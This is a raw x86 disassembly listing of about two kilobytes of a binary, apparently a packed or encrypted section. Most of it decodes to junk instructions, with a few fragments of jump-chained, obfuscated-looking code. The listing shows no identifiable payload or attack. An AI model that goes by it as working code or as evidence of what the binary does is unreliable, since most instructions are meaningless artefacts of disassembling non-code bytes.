  41876f:	ins    DWORD PTR es:[edi],dx
  418770:	test   al,0xdb
  418772:	(bad)  
  418773:	sub    BYTE PTR [edi-0x22],ah
  418776:	fcom   QWORD PTR [eax]
  418778:	xor    eax,0x6127e72
  41877d:	push   ebp
  41877e:	pop    eax
  41877f:	fisttp WORD PTR [ecx+0x54e297f9]
  418785:	dec    edx
  418786:	out    0x1f,al
  418788:	int3   
  418789:	pusha  
  41878a:	sti    
  41878b:	mov    esi,0x3dea82ea
  418790:	xor    eax,0x50f76dbb
  418795:	aam    0xe8
  418797:	jp     0x4187b0
  418799:	adc    BYTE PTR [eax+0x41],dl
  41879c:	fadd   DWORD PTR [bx-0x6c46]
  4187a1:	pop    ebx
  4187a2:	xor    edi,DWORD PTR ds:0xdf2910c
  4187a8:	rcl    DWORD PTR [ebx+0x67175118],cl
  4187ae:	cli    
  4187af:	cld    
  4187b0:	inc    eax
  4187b1:	adc    al,0x31
  4187b3:	jo     0x418764
  4187b5:	aas    
  4187b6:	shl    DWORD PTR [ebp-0x2e],cl
  4187b9:	dec    edx
  4187ba:	push   ss
  4187bb:	push   ds
  4187bc:	mov    ds:0xa238d006,eax
  4187c1:	xor    dl,BYTE PTR [edx]
  4187c3:	inc    edi
  4187c4:	mov    ebp,0x4aadd681
  4187c9:	add    BYTE PTR [eax],al
  4187cb:	cmp    eax,ecx
  4187cd:	jne    0x4188aa
  4187d3:	cmp    edx,esi
  4187d5:	jmp    0x4188a4
  4187da:	cmp    BYTE PTR [ebp+0x7b],0xd4
  4187de:	call   esi
  4187e0:	scas   eax,DWORD PTR es:[edi]
  4187e1:	jge    0x418852
  4187e3:	cmp    dh,ah
  4187e5:	xchg   edx,eax
  4187e6:	add    ebp,DWORD PTR [edx+0x44]
  4187e9:	ficom  WORD PTR [ebx]
  4187eb:	sbb    BYTE PTR [ecx],al
  4187ed:	add    BYTE PTR [edx+0x77000000],dh
  4187f3:	mov    ecx,0xca04786b
  4187f8:	and    DWORD PTR [ecx-0x4986143f],esi
  4187fe:	push   edx
  4187ff:	adc    BYTE PTR [esi],dh
  418801:	call   0x6fd1:0x470c001f
  418808:	xchg   ebp,eax
  418809:	addr16 nop
  41880b:	mov    ecx,0xdbb42abc
  418810:	mov    es,WORD PTR [edi+esi*2+0x30]
  418814:	sahf   
  418815:	cdq    
  418816:	mov    eax,ds:0xcf4c9526
  41881b:	add    DWORD PTR [eax],eax
  41881d:	pop    edx
  41881e:	shl    DWORD PTR [eax-0x48],0xd2
  418822:	in     eax,dx
  418823:	imul   ebx,edi,0x57
  418826:	(bad)  
  418827:	jmp    0x709:0x971aa006
  41882e:	aam    0x74
  418830:	or     ch,BYTE PTR [ebx]
  418832:	jecxz  0x4187f8
  418834:	mov    eax,ds:0x5151cab8
  418839:	outs   dx,BYTE PTR ds:[esi]
  41883a:	sub    al,0xc3
  41883c:	push   DWORD PTR [ebp+0x5b]
  41883f:	or     al,0x18
  418841:	pop    ss
  418842:	out    dx,al
  418843:	mov    DWORD PTR [ecx-0x20],ebp
  418846:	or     dl,BYTE PTR [ebx]
  418848:	xor    DWORD PTR [ebp-0x3a],esi
  41884b:	and    DWORD PTR ds:0xc81d3fca,ebp
  418852:	shl    BYTE PTR [ebp+0x6de98604],cl
  418858:	xchg   edi,eax
  418859:	rcr    ecx,0xde
  41885c:	and    eax,DWORD PTR [eax+0x38]
  41885f:	mov    esp,0x2f181895
  418864:	mov    WORD PTR [ecx+0x291d267c],cs
  41886a:	es hlt 
  41886c:	mov    dh,0xdf
  41886e:	add    BYTE PTR [ebx],al
  418870:	push   0x64
  418872:	hlt    
  418873:	dec    ebp
  418874:	ret    
  418875:	ret    0xf07
  418878:	cmp    al,0xac
  41887a:	sbb    esp,DWORD PTR [ecx+0x55a72317]
  418880:	fst    st(3)
  418882:	jle    0x4188eb
  418884:	push   cs
  418885:	add    BYTE PTR [ecx+esi*1+0x4e9c6521],cl
  41888c:	shl    BYTE PTR [eax+0x405af137],1
  418892:	sub    ch,BYTE PTR [edi]
  418894:	lods   eax,DWORD PTR ds:[esi]
  418895:	adc    ah,BYTE PTR [ecx+0x2a]
  418898:	imul   esi,DWORD PTR [edi+0x7ef279f2],0xffffffed
  41889f:	mov    dl,0xaa
  4188a1:	cmp    al,0x6c
  4188a3:	or     BYTE PTR [edi],cl
  4188a5:	test   ah,al
  4188a7:	add    al,BYTE PTR [eax]
  4188a9:	add    BYTE PTR [ebx+0x4d8ba845],cl
  4188af:	lods   al,BYTE PTR ds:[esi]
  4188b0:	mov    edx,DWORD PTR [ebp-0x60]
  4188b3:	mov    esi,DWORD PTR [ebp-0x5c]
  4188b6:	add    eax,0x1147
  4188bb:	push   0x2298
  4188c0:	adc    ecx,0x50f3
  4188c6:	jmp    0x418995
  4188cb:	loop   0x4188ab
  4188cd:	pop    esi
  4188ce:	dec    edi
  4188cf:	jle    0x4188a0
  4188d1:	repz push DWORD PTR [edi]
  4188d4:	idiv   BYTE PTR [edx]
  4188d6:	int    0x91
  4188d8:	cs mov esi,ebx
  4188db:	lds    ebx,FWORD PTR [eax]
  4188dd:	add    DWORD PTR [eax],eax
  4188df:	mov    dl,0x0
  4188e1:	add    BYTE PTR [eax],al
  4188e3:	jnp    0x4188ae
  4188e5:	add    al,0xd3
  4188e7:	dec    ecx
  4188e8:	mov    cl,BYTE PTR [esi+edx*2-0x7eba2996]
  4188ef:	addr16 jne 0x4188b5
  4188f2:	addr16 int 0x43
  4188f5:	cs sti 
  4188f7:	test   eax,0x39451930
  4188fc:	mov    eax,ds:0x95794ed9
  418901:	cli    
  418902:	cmp    BYTE PTR [ecx+eax*2+0x4eaca32e],ah
  418909:	ret    
  41890a:	in     al,dx
  41890b:	dec    edi
  41890c:	outs   dx,DWORD PTR ds:[esi]
  41890d:	push   edx
  41890e:	sub    DWORD PTR cs:[edx+0x59d361e0],ebp
  418915:	int3   
  418916:	leave  
  418917:	std    
  418918:	call   0x682:0x920528c0
  41891f:	mov    ebx,0xd6152a59
  418924:	push   edx
  418925:	sub    eax,0xd26d0204
  41892a:	push   es
  41892b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892c:	xchg   ecx,eax
  41892d:	sub    edi,esp
  41892f:	mov    WORD PTR [ecx],fs
  418931:	leave  
  418932:	cdq    
  418933:	jb     0x41894b
  418935:	xchg   edi,eax
  418936:	cli    
  418937:	inc    edi
  418938:	fldcw  WORD PTR [edx-0x1e]
  41893b:	popf   
  41893c:	sub    eax,0x6aa67129
  418941:	mov    ch,0x76
  418943:	pop    es
  418944:	xchg   edi,eax
  418945:	or     BYTE PTR [edx],0x62
  418948:	in     eax,0x81
  41894a:	pop    edi
  41894b:	aam    0xee
  41894d:	and    eax,0x6ba4499c
  418952:	data16 outs dx,BYTE PTR ds:[esi]
  418954:	lahf   
  418955:	clc    
  418956:	int    0xd2
  418958:	cld    
  418959:	mov    fs,esi
  41895b:	ins    DWORD PTR es:[edi],dx
  41895c:	sar    BYTE PTR [eiz*1+0x3ecdbe19],0x8
  418964:	rcr    BYTE PTR [edi],1
  418966:	sahf   
  418967:	hlt    
  418968:	aaa    
  418969:	inc    eax
  41896a:	into   
  41896b:	daa    
  41896c:	mov    al,ds:0x18c96361
  418971:	xor    eax,0x1eb01ea2
  418976:	add    esi,DWORD PTR [edi]
  418978:	pop    ebp
  418979:	cmc    
  41897a:	lds    ecx,FWORD PTR [eax]
  41897c:	pop    eax
  41897d:	mov    ecx,0xc0815e6
  418982:	scas   al,BYTE PTR es:[edi]
  418983:	sbb    eax,0x631f606e
  418988:	push   0xffffff81
  41898a:	push   esp
  41898b:	ret    0xb225
  41898e:	sar    BYTE PTR [eax],1
  418990:	lock cwde 
  418992:	mov    ds:0x45689cb7,eax
  418997:	add    eax,DWORD PTR [eax]
  418999:	add    BYTE PTR [ebx],ah
  41899b:	into   
  41899c:	jmp    0x418a6b
  4189a1:	lahf   
  4189a2:	jecxz  0x4189d3
  4189a4:	or     al,0x7f
  4189a6:	int3   
  4189a7:	mov    edi,0x39cb48f3
  4189ac:	imul   esp,DWORD PTR [edx+0x7760e69b],0xb2000119
  4189b6:	add    BYTE PTR [eax],al
  4189b8:	add    BYTE PTR [eax+0x11014621],bl
  4189be:	sub    eax,0x56b3141c
  4189c3:	xchg   ebp,eax
  4189c4:	push   cs
  4189c5:	into   
  4189c6:	aas    
  4189c7:	int    0xda
  4189c9:	push   ds
  4189ca:	push   eax
  4189cb:	xchg   ecx,eax
  4189cc:	and    BYTE PTR [esi+0x7d],cl
  4189cf:	add    DWORD PTR [edi+0x2037e462],ebx
  4189d5:	jbe    0x418979
  4189d7:	scas   eax,DWORD PTR es:[edi]
  4189d8:	xlat   BYTE PTR ds:[ebx]
  4189d9:	std    
  4189da:	mov    edx,0x54c8c86d
  4189df:	xor    ah,al
  4189e1:	js     0x4189e8
  4189e3:	push   edx
  4189e4:	cmp    bl,dh
  4189e6:	mov    es,WORD PTR [edi-0x5bc20756]
  4189ec:	bound  edi,QWORD PTR [edi+0x4d]
  4189ef:	push   ebx
  4189f0:	outs   dx,BYTE PTR ds:[esi]
  4189f1:	dec    ebx
  4189f2:	out    0xb6,eax
  4189f4:	in     eax,0x91
  4189f6:	mov    edi,DWORD PTR [ebx-0x168a7bb1]
  4189fc:	clc    
  4189fd:	aam    0xd4
  4189ff:	mov    edi,0x8887e072
  418a04:	xor    al,0xc2
  418a06:	in     al,0x10
  418a08:	gs jmp 0x3b3c423a
  418a0e:	jmp    0xc8d1:0x4c95f687
  418a15:	fcmovnbe st,st(2)
  418a17:	or     eax,0x9076bc17
  418a1c:	fisub  DWORD PTR [esi+edx*2+0x71]
  418a20:	ss xchg edx,eax
  418a22:	sar    BYTE PTR [esi],1
  418a24:	mov    ds:0x37b063f7,eax
  418a29:	retf   0x9daf
  418a2c:	idiv   BYTE PTR [eax-0x73eab50b]
  418a32:	mov    eax,0x8f2176e6
  418a37:	and    DWORD PTR [ebx+esi*1+0x4dba06a1],ebp
  418a3e:	dec    esp
  418a3f:	stc    
  418a40:	lods   eax,DWORD PTR ds:[esi]
  418a41:	adc    eax,0x1ef8f820
  418a46:	xor    DWORD PTR [ebp+edx*1+0x965bae],esp
  418a4d:	pop    esi
  418a4e:	in     al,dx
  418a4f:	mov    eax,0x6bfa2f16
  418a54:	pop    ebx
  418a55:	mov    ch,0x95
  418a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a58:	icebp  
  418a59:	cld    
  418a5a:	xchg   bp,ax
  418a5c:	arpl   WORD PTR [ebp-0x6476a5de],bp
  418a62:	pop    eax
  418a63:	push   ss
  418a64:	mov    edx,0x4654211a
  418a69:	rol    BYTE PTR [eax+0x5051c223],0xe8
  418a70:	pop    edx
  418a71:	pusha  
  418a72:	add    DWORD PTR [eax],eax
  418a74:	mov    ecx,DWORD PTR ds:0x4331b4
  418a7a:	mov    ecx,DWORD PTR [ecx+0x1c0]
  418a80:	mov    ecx,DWORD PTR [ecx]
  418a82:	jmp    0x418b51
  418a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a88:	retf   0x4692
  418a8b:	(bad)  
  418a8c:	pop    esi
  418a8d:	hlt    
  418a8e:	jmp    0xeeaf:0x5fe48abe
  418a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a96:	sub    DWORD PTR gs:[edx],ebx
  418a99:	add    DWORD PTR [eax],eax
  418a9b:	mov    dl,0x0
  418a9d:	add    BYTE PTR [eax],al
  418a9f:	ret    
  418aa0:	pop    eax
  418aa1:	xor    edx,DWORD PTR [esi]
  418aa3:	inc    ebp
  418aa4:	sub    BYTE PTR [eax+0x4a],dl
  418aa7:	cmp    cl,BYTE PTR [edx-0x2d98a34d]
  418aad:	jge    0x418a9d
  418aaf:	(bad)  
  418ab0:	sbb    bh,cl
  418ab2:	or     eax,0xf8e5bf0d
  418ab7:	inc    ebp
  418ab8:	ins    DWORD PTR es:[edi],dx
  418ab9:	lods   al,BYTE PTR ds:[esi]
  418aba:	out    dx,eax
  418abb:	packsswb mm1,QWORD PTR [edi-0x1]
  418abf:	sub    cl,BYTE PTR [edi-0x39333f72]
  418ac5:	and    bh,0xd5
  418ac8:	mov    fs,ebp
  418aca:	cmp    bl,BYTE PTR ds:0xab3d786e
  418ad0:	sub    DWORD PTR [ebx-0xe2db964],0xffffffbf
  418ad7:	pop    esi
  418ad8:	mov    bl,0x15
  418ada:	imul   ecx,DWORD PTR ds:[edi],0xb9ab659
  418ae1:	pop    eax
  418ae2:	stos   BYTE PTR es:[edi],al
  418ae3:	or     DWORD PTR [edx],esp
  418ae5:	inc    edx
  418ae6:	mov    esi,0x7fe8205b
  418aeb:	loop   0x418aaf
  418aed:	(bad)  
  418aee:	push   edi
  418aef:	mov    ecx,esi
  418af1:	inc    ecx
  418af2:	imul   esp,DWORD PTR [esi-0x121b1327],0xfffffff6
  418af9:	in     eax,dx
  418afa:	out    dx,al
  418afb:	enter  0x252c,0xe3
  418aff:	test   al,0x88
  418b01:	mov    bh,0xf7
  418b03:	pop    ss
  418b04:	xchg   edi,eax
  418b05:	xchg   BYTE PTR [esi],cl
  418b07:	jmp    0x76e3d3df
  418b0c:	loop   0x418b11
  418b0e:	xor    ecx,DWORD PTR [esi-0x511ffd91]
  418b14:	mov    al,0x1
  418b16:	push   eax
  418b17:	popf   
  418b18:	push   ecx
  418b19:	jo     0x418ac0
  418b1b:	mov    ds,WORD PTR [esi+0x495bb2c4]
  418b21:	jno    0x418b54
  418b23:	shr    DWORD PTR [ecx],cl
  418b25:	retf   0x7189
  418b28:	test   DWORD PTR [esi],ebx
  418b2a:	call   0x10a1f836
  418b2f:	cli    
  418b30:	icebp  
  418b31:	call   0x2b1a5b2d
  418b36:	cld    
  418b37:	inc    ecx
  418b38:	or     cl,ah
  418b3a:	pusha  
  418b3b:	iret   
  418b3c:	stos   BYTE PTR es:[edi],al
  418b3d:	mov    edx,0xcaf747b3
  418b42:	push   cs
  418b43:	mov    eax,DWORD PTR [edx+0x4185e6f]
  418b49:	inc    ebx
  418b4a:	xchg   esp,eax
  418b4b:	or     al,0x52
  418b4d:	lock mov esi,0xe2352d4f
  418b53:	mov    al,ds:0xf2810006
  418b58:	mov    dl,0xeb
  418b5a:	xchg   esi,eax
  418b5b:	add    DWORD PTR [ebx],esi
  418b5d:	idiv   BYTE PTR [ebx]
  418b5f:	enter  0x850f,0x37
  418b63:	or     eax,0xf23b0000
  418b68:	jne    0x41989d
  418b6e:	mov    eax,DWORD PTR [ebp-0x4]
  418b71:	or     eax,0x794b
  418b76:	add    eax,0x7173
  418b7b:	xor    edx,edx
  418b7d:	push   0x1b
  418b7f:	pop    ecx
  418b80:	div    ecx
  418b82:	jmp    0x418c51
  418b87:	test   bh,bl
  418b89:	and    ah,BYTE PTR [ebx+0x7b]
  418b8c:	inc    ebp
  418b8e:	(bad)  
  418b8f:	call   FWORD PTR [eax-0x4d1d6004]
  418b95:	fld    TBYTE PTR [ecx-0x25]
  418b98:	sbb    al,BYTE PTR [ecx]
  418b9a:	add    BYTE PTR [edx+0x3f000000],dh
  418ba0:	fwait
  418ba1:	clc    
  418ba2:	lods   al,BYTE PTR ds:[esi]
  418ba3:	out    dx,eax
  418ba4:	and    al,0xa5
  418ba6:	retf   
  418ba7:	lock je 0x418bc1
  418baa:	pusha  
  418bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bac:	shr    BYTE PTR [edx],0x9b
  418baf:	mov    ecx,ebx
  418bb1:	jg     0x418be7
  418bb3:	pop    edx
  418bb4:	fisttp WORD PTR [ebx-0x26]
  418bb7:	aas    
  418bb8:	lea    ecx,ss:[ebp+0x23f1845e]
  418bbf:	sub    cl,bh
  418bc1:	nop
  418bc2:	dec    eax
  418bc3:	jo     0x418be9
  418bc5:	nop
  418bc6:	call   0xa5dedfbf
  418bcb:	test   al,0x6a
  418bcd:	call   DWORD PTR [edx+ebx*1]
  418bd0:	sahf   
  418bd1:	cmp    BYTE PTR [edx+0x72ea7995],al
  418bd7:	cmp    BYTE PTR [edi-0x47],dl
  418bda:	fwait
  418bdb:	lods   al,BYTE PTR ds:[esi]
  418bdc:	aas    
  418bdd:	pusha  
  418bde:	cld    
  418bdf:	push   ebx
  418be0:	sahf   
  418be1:	adc    eax,0xcdc912de
  418be6:	add    BYTE PTR [edx-0x324b6020],dl
  418bec:	dec    ebp
  418bed:	mov    ch,0x94
  418bef:	push   edi
  418bf0:	sahf   
  418bf1:	or     esp,DWORD PTR es:[ebp+edx*8+0x5e]
  418bf6:	cli    
  418bf7:	mov    eax,0xf87d3b16
  418bfc:	mov    al,ds:0xfd8647df
  418c01:	ja     0x418c63
  418c03:	popf   
  418c04:	cmp    ah,dh
  418c06:	cwde   
  418c07:	sahf   
  418c08:	xchg   ebp,eax
  418c09:	loop   0x418bed
  418c0b:	xchg   BYTE PTR [edx+0x67],cl
  418c0e:	adc    al,0xac
  418c10:	ss or  bp,sp
  418c14:	mov    ds:0xdeb70bcb,eax
  418c19:	cdq    
  418c1a:	out    dx,al
  418c1b:	sub    al,0x74
  418c1d:	out    dx,eax
  418c1e:	push   cs
  418c1f:	test   BYTE PTR ds:0x9c70638b,al
  418c25:	stc    
  418c26:	lahf   
  418c27:	push   eax
  418c28:	and    eax,0x6d7f8d3b
  418c2d:	cmp    al,0x66
  418c2f:	popa   
  418c30:	fdivr  QWORD PTR [edi]
  418c32:	int3   
  418c33:	cmc    
  418c34:	push   ecx
  418c35:	add    eax,0xca4071dc
  418c3a:	rcr    BYTE PTR [ecx],0xdf
  418c3d:	inc    ebp
  418c3e:	dec    esi
  418c3f:	xchg   BYTE PTR [esp-0x1b1964a1],dh
  418c46:	mov    ecx,0xd15fc114
  418c4b:	cmp    BYTE PTR gs:[esi-0x74319bca],bh
  418c52:	dec    ebp
  418c53:	clc    
  418c54:	xor    edx,edx
  418c56:	sub    eax,ecx
  418c58:	mov    ecx,DWORD PTR [ebp-0xc]
  418c5b:	or     eax,ecx
  418c5d:	mov    ecx,0xffffe7bf
  418c62:	sub    ecx,eax
  418c64:	mov    eax,ds:0x433240
  418c69:	add    eax,ecx
  418c6b:	xor    DWORD PTR ds:0x433238,eax
  418c71:	mov    eax,DWORD PTR [ebp-0x10]
  418c74:	jmp    0x418d43
  418c79:	imul   edx,DWORD PTR [ecx],0x6f
  418c7c:	repz jg 0x418c7e
  418c7f:	call   FWORD PTR [ecx-0x214085d4]
  418c85:	jp     0x418c47
  418c87:	add    BYTE PTR [esi-0x73],cl
  418c8a:	sbb    eax,DWORD PTR [ecx]
  418c8c:	add    BYTE PTR [edx-0x50000000],dh
  418c92:	stos   DWORD PTR es:[edi],eax
  418c93:	push   es
  418c94:	adc    cl,dh
  418c96:	jg     0x418d10
  418c98:	sub    DWORD PTR [eax],edx
  418c9a:	push   cs
  418c9b:	or     al,0xff
  418c9d:	mov    DWORD PTR [ebp-0x2f],ecx
  418ca0:	sub    cx,si
  418ca3:	dec    edx
  418ca4:	repnz (bad) 
  418ca6:	not    ebp
  418ca8:	xor    ah,BYTE PTR [ebx+0x44]
  418cab:	loope  0x418d28
  418cad:	(bad)  
  418caf:	or     esp,ecx
  418cb1:	push   esp
  418cb2:	dec    edi
  418cb3:	imul   eax,DWORD PTR [esp+eiz*2-0x2c],0xffffff95
  418cb8:	dec    edi
  418cb9:	pop    edi
  418cba:	or     eax,0xed476976
  418cbf:	in     al,dx
  418cc0:	ror    DWORD PTR [ecx],1
  418cc2:	test   DWORD PTR [eax],ebx
  418cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc5:	lock mov ecx,0xadc8641b
  418ccb:	pop    ebx
  418ccc:	add    DWORD PTR [ebx-0x52475ecb],0xffffffbb
  418cd3:	inc    ecx
  418cd4:	mov    ?,WORD PTR [edx*8-0x76bdc835]
  418cdb:	ror    DWORD PTR [eax-0xc9242a4],0x10
  418ce2:	lods   eax,DWORD PTR ds:[esi]
  418ce3:	inc    esp
  418ce4:	jecxz  0x418c7b
  418ce6:	rol    DWORD PTR [esp+eax*8-0x28d1f9ab],1
  418ced:	sub    eax,ebp
  418cef:	pushf  
  418cf0:	inc    edi
  418cf1:	pop    ebx
  418cf2:	jp     0x418d57
  418cf4:	sub    cl,dh
  418cf6:	outs   dx,BYTE PTR ds:[esi]
  418cf7:	pop    ss
  418cf8:	outs   dx,BYTE PTR ds:[esi]
  418cf9:	rcl    BYTE PTR [eax],1
  418cfb:	mov    al,ds:0x14177714
  418d00:	pop    edx
  418d01:	sbb    eax,0x403f6302
  418d06:	mov    BYTE PTR [edx],dh
  418d08:	mov    edi,0xc955be7f
  418d0d:	and    dh,BYTE PTR [edx+0x14]
  418d10:	cmc    
  418d11:	sub    al,0x68
  418d13:	cmc    
  418d14:	mov    WORD PTR [edi-0x5d],gs
  418d17:	add    DWORD PTR [ebp-0x4b],edi
  418d1a:	clc    
  418d1b:	mov    ch,0x33
  418d1d:	push   ss
  418d1e:	and    edi,DWORD PTR [ebx]
  418d20:	retf   
  418d21:	push   es
  418d22:	fdiv   DWORD PTR ds:[eax+0x74]
  418d26:	xor    eax,0xadf206da
  418d2b:	les    ebx,FWORD PTR [ebx+0x1c894b2c]
  418d31:	push   ebp
  418d32:	xlat   BYTE PTR ds:[ebx]
  418d33:	(bad)  
  418d34:	into   
  418d35:	pop    ss
  418d36:	sbb    dh,bh
  418d38:	sti    
  418d39:	xchg   edx,eax
  418d3a:	lea    edi,ds:0x84ee6645
  418d40:	pop    edi
  418d41:	cmp    DWORD PTR [esi],esp
  418d43:	mov    ecx,DWORD PTR [ebp-0x14]
  418d46:	add    eax,0x3cdb
  418d4b:	jmp    0x418e1a
  418d50:	cmp    al,0xfb
  418d52:	in     al,0x8f
  418d54:	out    0x9f,eax
  418d56:	jg     0x418d53
  418d58:	fucomip st,st(5)
  418d5a:	adc    al,0x9f
  418d5c:	mov    edi,0x3fc78844
  418d61:	sbb    al,0x1
  418d63:	add    BYTE PTR [edx-0x62000000],dh
  418d69:	cld    
  418d6a:	aad    0xf1
  418d6c:	adc    esi,DWORD PTR [edx-0x7cb3e1c7]
  418d72:	xor    al,BYTE PTR [eax]
  418d74:	push   ds
  418d75:	push   ds
  418d76:	fmul   st,st(3)
  418d78:	inc    ebp
  418d79:	iret   
  418d7a:	mov    esp,0x4df90a66
  418d7f:	out    0xcb,al
  418d81:	cmp    eax,0x20449414
  418d86:	or     BYTE PTR [edx+0x4c4a6089],0x85
  418d8d:	mov    esi,gs
  418d8f:	scas   eax,DWORD PTR es:[edi]
  418d90:	mov    bh,0x97
  418d92:	mov    eax,0x5eaab300
  418d97:	fadd   DWORD PTR [eax]
  418d99:	xchg   ebx,eax
  418d9a:	mov    ?,WORD PTR fs:[edx+0x3c30fdba]
  418da1:	call   0xc9ec:0xb55ff7eb
  418da8:	xchg   BYTE PTR [ebx-0x47b51610],bh
  418dae:	xor    esi,DWORD PTR [ebp+0x5403b066]
  418db4:	adc    BYTE PTR [ecx],ah
  418db6:	fst    QWORD PTR [ebx+0x27c0e107]
  418dbc:	pushf  
  418dbd:	ror    BYTE PTR [edi],cl
  418dbf:	xchg   esi,eax
  418dc0:	fadd   DWORD PTR [esi]
  418dc2:	xlat   BYTE PTR ds:[ebx]
  418dc3:	jecxz  0x418e09
  418dc5:	fld    DWORD PTR [eax-0x47697aaf]
  418dcb:	scas   eax,DWORD PTR es:[edi]
  418dcc:	fadd   st,st(7)
  418dce:	mov    esp,0xe45ae896
  418dd3:	mov    edi,eax
  418dd5:	and    al,0x38
  418dd7:	mov    edi,0xa51c7479
  418ddc:	jp     0x418dbe
  418dde:	outs   dx,DWORD PTR ds:[esi]
  418ddf:	cmc    
  418de0:	mov    ?,WORD PTR [edx-0x19]
  418de3:	add    ebp,DWORD PTR [edx-0x4a]
  418de6:	cwde   
  418de7:	mov    esp,0x1cbd30b9
  418dec:	push   ebp
  418ded:	sub    al,0xd9
  418def:	push   0x6f138cd
  418df4:	mov    al,ds:0x1f7a48ad
  418df9:	outs   dx,DWORD PTR ds:[esi]
  418dfa:	dec    edx
  418dfb:	ficom  WORD PTR [esi]
  418dfd:	popa   
  418dfe:	enter  0xb024,0x17
  418e02:	fadd   st,st(6)
  418e04:	xchg   ebp,eax
  418e05:	cld    
  418e06:	adc    ebx,edi
  418e08:	or     BYTE PTR [edi+esi*2+0xf08b6b3],al
  418e0f:	sbb    ebx,0x3888543c
  418e15:	sbb    ah,BYTE PTR [edi]
  418e17:	push   es
  418e18:	push   edx
  418e19:	sbb    eax,0x79060d
  418e1e:	add    BYTE PTR [ebx],ch
  418e20:	ror    DWORD PTR [ebx-0x351617b3],0x0
  418e27:	add    BYTE PTR [eax],al
  418e29:	fld    QWORD PTR [esi-0x15]
  418e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2d:	sti    
  418e2e:	lods   eax,DWORD PTR ds:[esi]
  418e2f:	fistp  QWORD PTR [esi-0x41]
  418e32:	mov    esi,0x3b5bcdaf
  418e37:	gs xchg edx,eax
  418e39:	icebp  
  418e3a:	sbb    al,0x1
  418e3c:	add    BYTE PTR [edx+0x11000000],dh
  418e42:	jbe    0x418dcf
  418e44:	and    ecx,DWORD PTR [esi]
  418e46:	test   DWORD PTR [ebp+ebx*8+0x3b],0xad87a671
  418e4e:	xchg   ecx,edx
  418e50:	push   edx
  418e51:	ins    DWORD PTR es:[edi],dx
  418e52:	call   0xa75e:0x221cd185
  418e59:	cmp    DWORD PTR [ebx+0x6],ecx
  418e5c:	xchg   edi,eax
  418e5d:	in     al,dx
  418e5e:	sbb    ch,BYTE PTR [ecx]
  418e60:	daa    
  418e61:	and    ecx,DWORD PTR [esi-0x29b9bdfc]
  418e67:	and    BYTE PTR [esi],bh
  418e69:	add    DWORD PTR [edi],ebx
  418e6b:	add    al,0x1c
  418e6e:	(bad)  
  418e6f:	scas   al,BYTE PTR es:[edi]
  418e70:	cdq    
  418e71:	stos   DWORD PTR es:[edi],eax
  418e72:	jge    0x418e2e
  418e74:	jle    0x418eea
  418e76:	adc    al,0xca
  418e78:	in     al,0x2f
  418e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e7b:	lahf   
  418e7c:	es xchg ebp,eax
  418e7e:	rcr    ch,0x6d
  418e81:	pop    esi
  418e82:	pop    ebp
  418e83:	push   es
  418e84:	enter  0x81b2,0x8c
  418e88:	leave  
  418e89:	rol    BYTE PTR [ebx],0x98
  418e8c:	push   ss
  418e8d:	ror    DWORD PTR [ebx],cl
  418e8f:	fstp   QWORD PTR [esi]
  418e91:	fcomi  st,st(7)
  418e93:	pop    es
  418e94:	repnz and BYTE PTR [ebp-0x70],al
  418e98:	shr    ebp,cl
  418e9a:	xchg   DWORD PTR [eax+0x7],edx
  418e9d:	push   edx
  418e9e:	cmp    al,0xcb
  418ea0:	retf   0x1946
  418ea3:	test   BYTE PTR ds:0x9feb816e,dh
  418ea9:	dec    ebp
  418eaa:	lea    ebx,[ecx+0x71]
  418ead:	or     al,0x8e
  418eaf:	int    0x42
  418eb1:	sub    ch,BYTE PTR [edi-0x6808eb0e]
  418eb7:	(bad)  
  418eb8:	cmp    al,0x36
  418eba:	vaddsd xmm4,xmm4,QWORD PTR [ebp-0x59228e2a]
  418ec2:	mov    al,0x7d
  418ec4:	push   eax
  418ec5:	mov    bl,0x7f
  418ec7:	mov    edi,0x5ed3442
  418ecc:	not    DWORD PTR [ecx-0x71]
  418ecf:	ins    BYTE PTR es:[edi],dx
  418ed0:	push   0x42
  418ed2:	push   ds
  418ed3:	pushw  ds
  418ed5:	shrd   DWORD PTR [ebx+ecx*1],eax,0x20
  418eda:	aaa    
  418edb:	fistp  DWORD PTR [eax+0x39]
  418ede:	push   0x4de6aefd
  418ee3:	mov    dh,0xbe
  418ee5:	retf   
  418ee6:	int3   
  418ee7:	scas   eax,DWORD PTR es:[edi]
  418ee8:	pop    ecx
  418ee9:	sbb    edx,DWORD PTR [ebx+ebp*1+0x77715ed2]
  418ef0:	dec    edx
  418ef1:	push   ebp
  418ef2:	outs   dx,BYTE PTR ds:[esi]
  418ef3:	xor    eax,0x209e
  418ef8:	div    ecx
  418efa:	mov    ecx,DWORD PTR [ebp-0x1c]
  418efd:	jmp    0x418fcc
  418f02:	jb     0x418f69
  418f04:	fsubrp st(5),st
  418f06:	(bad)  
  418f08:	jnp    0x418f01
  418f0a:	sub    BYTE PTR [edx+0x52],ah
  418f0d:	mov    eax,ds:0xc380be41
  418f12:	mov    ds:0xb200011d,eax
  418f17:	add    BYTE PTR [eax],al
  418f19:	add    BYTE PTR [ebx+0x68],dh
  418f1c:	and    esi,DWORD PTR [ebx]
  418f1e:	pop    ecx
  418f1f:	outs   dx,BYTE PTR ds:[esi]
  418f20:	jbe    0x418eb8
  418f22:	aam    0x92
  418f24:	dec    ebp
  418f25:	add    DWORD PTR ds:0x81f12bd,0xbed4a0d6
  418f2f:	dec    DWORD PTR [ebx+edi*2+0x5b]
  418f33:	jno    0x418f20
  418f35:	pop    ebx
  418f36:	xchg   dh,cl
  418f38:	leave  
  418f39:	push   es
  418f3a:	cld    
  418f3b:	mov    DWORD PTR [ecx],ecx
  418f3d:	es je  0x418f1e
  418f40:	arpl   WORD PTR [edi+0x5a],si
  418f43:	push   ds
  418f44:	lock jo 0x418ef4
  418f47:	stos   DWORD PTR es:[edi],eax
  418f48:	rol    DWORD PTR [esi+0x65b6cc45],0xa0
  418f4f:	clc    
  418f50:	cmp    bh,bh
  418f52:	pop    ecx
  418f53:	jns    0x418f03
  418f55:	inc    edx
  418f56:	sub    BYTE PTR [ebp-0x3f],ch
  418f59:	je     0x418f0e
  418f5b:	lock sub bp,di
